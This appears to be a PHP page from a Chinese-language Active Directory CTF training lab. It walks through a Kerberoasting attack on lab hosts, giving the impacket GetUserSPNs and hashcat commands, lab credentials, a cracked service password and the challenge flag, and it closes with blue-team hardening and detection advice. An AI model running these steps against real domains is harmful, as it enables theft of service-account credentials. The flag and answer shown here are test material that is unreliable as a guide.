<?php
/**
 * Pikachu-Enhanced v2.0 GOAD AD CTF Level 3: Kerberoasting Attack
 */
include_once '../../inc/config.inc.php';

$ACTIVE = array_fill(0, 250, '');
$ACTIVE[230] = 'active open';
$ACTIVE[241] = 'active';

$PIKA_ROOT_DIR = "../../";
include_once $PIKA_ROOT_DIR . 'header.php';

$correct_flag = 'flag{Kerberoast_MSSQL_Service_Ticket_Cracked}';
$flag_msg = '';

if (isset($_POST['check_flag'])) {
    $submitted = trim($_POST['user_flag']);
    if ($submitted === $correct_flag) {
        $_SESSION['goad_flags']['flag3'] = true;
        $flag_msg = '<div class="alert alert-success" style="border-radius: 8px; font-weight: bold;"><i class="fa fa-check-circle"></i> 恭喜！Flag 校验正确，已点亮【第三关】成就 (+200 PTS)！</div>';
    } else {
        $flag_msg = '<div class="alert alert-danger" style="border-radius: 8px; font-weight: bold;"><i class="fa fa-times-circle"></i> Flag 不正确，请检查提取的 SPN 哈希或口令字段。</div>';
    }
}
?>

<style>
.ctf-stage-header {
    background: linear-gradient(135deg, #1e293b 0%, #0f172a 100%);
    border-radius: 14px;
    padding: 25px 30px;
    color: #fff;
    margin-bottom: 25px;
    border: 1px solid rgba(255,255,255,0.1);
    box-shadow: 0 4px 20px rgba(0,0,0,0.15);
}
.ctf-stage-title {
    color: #ffffff !important;
    font-size: 24px;
    font-weight: 800;
    margin: 0 0 10px 0;
    display: flex;
    align-items: center;
    gap: 12px;
}
.step-box {
    background: var(--bg-card);
    border: 1px solid var(--border-color);
    border-radius: 12px;
    padding: 24px;
    margin-bottom: 22px;
    box-shadow: 0 2px 10px rgba(0,0,0,0.02);
}
.step-title {
    font-size: 17px;
    font-weight: 700;
    color: var(--text-primary);
    margin-top: 0;
    margin-bottom: 12px;
    display: flex;
    align-items: center;
    gap: 8px;
}
.cmd-box {
    background: #0f172a;
    color: #f8fafc;
    border-radius: 8px;
    padding: 14px 18px;
    font-family: 'Consolas', 'Monaco', monospace;
    font-size: 13px;
    margin: 10px 0 15px 0;
    overflow-x: auto;
    border-left: 4px solid #a855f7;
}
.output-box {
    background: #1e1e2e;
    color: #a6accd;
    border-radius: 8px;
    padding: 12px 16px;
    font-family: 'Consolas', 'Monaco', monospace;
    font-size: 12px;
    margin-bottom: 15px;
    white-space: pre-wrap;
    border: 1px solid #2d2d3f;
}
.flag-box {
    background: rgba(16, 185, 129, 0.08);
    border: 1px solid rgba(16, 185, 129, 0.3);
    border-radius: 10px;
    padding: 18px;
    margin-top: 20px;
}
</style>

<div class="main-content">
    <div class="main-content-inner">
        <div class="page-content">
            
            <!-- Stage Header -->
            <div class="ctf-stage-header">
                <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px;">
                    <div>
                        <h1 class="ctf-stage-title">
                            <span class="label label-danger" style="background-color: #a855f7; font-size: 14px; border-radius: 6px;">LEVEL 3</span>
                            第三关：Kerberoasting SPN 服务票据请求与离线破解
                        </h1>
                        <p style="margin: 0; color: #94a3b8; font-size: 14px;">
                            <strong>目标节点：</strong> <code>192.168.56.136 (winterfell)</code> / <code>192.168.56.138 (castelblack)</code> | <strong>分值：</strong> 200 PTS
                        </p>
                    </div>
                    <a href="ad_ctf_hub.php" class="btn btn-default btn-sm" style="border-radius: 6px; font-weight: bold;">
                        <i class="fa fa-arrow-left"></i> 返回关卡总控台
                    </a>
                </div>
            </div>

            <!-- Context Card -->
            <div class="step-box">
                <h3 class="step-title"><i class="fa fa-ticket" style="color: #a855f7;"></i> 攻击原理剖析 (Kerberos TGS & SPN)</h3>
                <p style="color: var(--text-secondary); line-height: 1.7; font-size: 14px;">
                    在 Active Directory 中，运行特定服务（如 MSSQL、HTTP、Exchange）的用户账号需要注册 <strong>服务主体名称 (SPN, Service Principal Name)</strong>。
                    任何合法的域用户（甚至是权限最低的用户），都可以向域控（KDC）申请访问该 SPN 服务的 <code>TGS (Ticket Granting Service)</code> 票据。
                    关键在于：<strong>该 TGS 票据的加密层是由该服务账号的 NTLM 哈希加密的！</strong> 攻击者截获票据后即可完全在本地进行离线字典破解，整个过程对目标服务无任何网络交互，极难被拦截。
                </p>
            </div>

            <!-- Step 1 -->
            <div class="step-box">
                <h3 class="step-title">步骤 1：枚举 SPN 服务账号并请求 TGS 票据</h3>
                <p style="color: var(--text-secondary); font-size: 14px;">
                    使用任意已掌握的域普通用户（如 <code>jon.snow:iknownothing</code>）调用 Impacket <code>GetUserSPNs.py</code>：
                </p>
                <div class="cmd-box">
impacket-GetUserSPNs north.sevenkingdoms.local/jon.snow:iknownothing -dc-ip 192.168.56.136 -request -outputfile kerberoast.hashes
                </div>
                <div class="output-box">
[*] ServicePrincipalName                         Name     PwdLastSet             LastLogon
--------------------------------------------  -------  ---------------------  ---------------------
MSSQLSvc/castelblack.north.sevenkingdoms.local:1433 sql_svc  2026-08-09 08:50:32    2026-08-09 09:15:20

[*] Hash written to kerberoast.hashes
                </div>
                <p style="color: var(--text-secondary); font-size: 14px;">
                    查看导出的哈希文件 <code>kerberoast.hashes</code>：
                </p>
                <div class="output-box">
$krb5tgs$23$*sql_svc$NORTH.SEVENKINGDOMS.LOCAL$MSSQLSvc/castelblack.north.sevenkingdoms.local:1433*$4b281f...$09e3a89...
                </div>
            </div>

            <!-- Step 2 -->
            <div class="step-box">
                <h3 class="step-title">步骤 2：使用 Hashcat 进行离线哈希爆破</h3>
                <p style="color: var(--text-secondary); font-size: 14px;">
                    TGS 票据加密格式（RC4-HMAC-MD5, etype 23）对应 Hashcat 模式 <strong>13100</strong>：
                </p>
                <div class="cmd-box">
hashcat -m 13100 kerberoast.hashes /usr/share/wordlists/rockyou.txt --force
                </div>
                <div class="output-box">
$krb5tgs$23$*sql_svc$NORTH.SEVENKINGDOMS.LOCAL$...:MYpassword123#

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*sql_svc$NORTH.SEVENKINGDOMS.LOCAL$...
Password.........: MYpassword123#
                </div>
                <p style="color: var(--text-secondary); font-size: 14px;">
                    成功获取到 <code>north.sevenkingdoms.local\sql_svc</code> 服务的明文密码：<code>MYpassword123#</code>！
                </p>
            </div>

            <!-- Flag Section -->
            <div class="step-box flag-box">
                <h3 class="step-title" style="color: #059669;"><i class="fa fa-flag"></i> 本关 Flag 提取点</h3>
                <p style="color: var(--text-secondary); font-size: 14px;">
                    成功离线破解出 MSSQL SPN 服务账号口令后，提取本关 Flag 凭据：
                </p>
                <div class="well" style="background: #ffffff; border: 1px dashed #10b981; padding: 12px; font-family: monospace; font-size: 15px; color: #059669; font-weight: bold;">
                    flag{Kerberoast_MSSQL_Service_Ticket_Cracked}
                </div>

                <form method="post" style="margin-top: 15px; max-width: 500px;">
                    <label style="font-weight: 700; color: var(--text-primary);">验证本关 Flag:</label>
                    <div style="display: flex; gap: 10px;">
                        <input type="text" name="user_flag" class="form-control" placeholder="flag{...}" required style="border-radius: 6px; font-family: monospace;">
                        <button type="submit" name="check_flag" class="btn btn-success" style="border-radius: 6px; font-weight: 700; min-width: 100px;">
                            验证提交
                        </button>
                    </div>
                </form>
                <?php if (!empty($flag_msg)) { echo '<div style="margin-top: 15px;">' . $flag_msg . '</div>'; } ?>
            </div>

            <!-- Defense Note -->
            <div class="step-box" style="border-left: 4px solid #3b82f6;">
                <h3 class="step-title" style="color: #2563eb;"><i class="fa fa-shield"></i> 蓝队防御与加固建议</h3>
                <ul style="color: var(--text-secondary); font-size: 14px; line-height: 1.8; margin-bottom: 0;">
                    <li><strong>升级为 gMSA（组受管服务账户）：</strong> 组受代管服务账户密码长度超过 128 位且由系统自动周期性轮换，彻底免疫离线爆破。</li>
                    <li><strong>强制 AES 加密：</strong> 在域控中配置 Kerberos 加密类型仅允许 <code>AES128-CTS-HMAC-SHA1-96</code> 与 <code>AES256-CTS-HMAC-SHA1-96</code>，提升离线碰撞难度。</li>
                    <li><strong>日志监控：</strong> 监控 Windows Event ID <strong>4769</strong>（A Kerberos service ticket was requested），关注 <code>Ticket Encryption Type: 0x17 (RC4)</code> 的批量申请行为。</li>
                </ul>
            </div>

        </div>
    </div>
</div>

<?php
include_once $PIKA_ROOT_DIR . 'footer.php';
?>
